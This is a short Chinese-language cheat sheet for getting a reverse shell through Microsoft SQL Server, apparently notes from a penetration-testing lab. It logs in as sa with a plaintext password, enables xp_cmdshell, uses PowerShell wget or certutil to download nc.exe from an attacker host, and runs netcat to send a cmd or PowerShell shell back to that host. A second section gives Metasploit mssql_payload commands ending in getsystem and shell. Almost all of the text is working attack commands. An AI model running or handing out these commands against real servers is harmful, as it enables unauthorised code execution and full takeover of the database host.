# 反弹shell

```bash
1. 连接数据库
sqsh -S 10.11.1.31 -U sa -P 'poiuytrewq'

2. 查询权限（只有sa用户才能开启xcdm）
select is_srvrolemember('sysadmin');
回显是1就是sa用户

3. 开启xcmd并测试是否成功
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'

4. 反弹shell
exec xp_cmdshell "powershell -c cd C:\users\public;wget http://192.168.119.175/nc.exe -o .\nc.exe";
exec xp_cmdshell "powershell -c cd C:\users\public;.\nc.exe -e powershell.exe 192.168.119.175 8888";

或者
exec xp_cmdshell certutil.exe -urlcache -f http://10.10.16.3/nc.exe ..\..\Temp\nc.exe
exec xp_cmdshell ..\..\Temp\nc.exe 10.10.14.12 4444 -e cmd.exe
```

2， 利用msf

```bash
use exploit/windows/mssql/mssql_payload
set lhost xxx
set rhost xxx
set password xxx
set USERNAME xxx
run
getsystem
shell
```
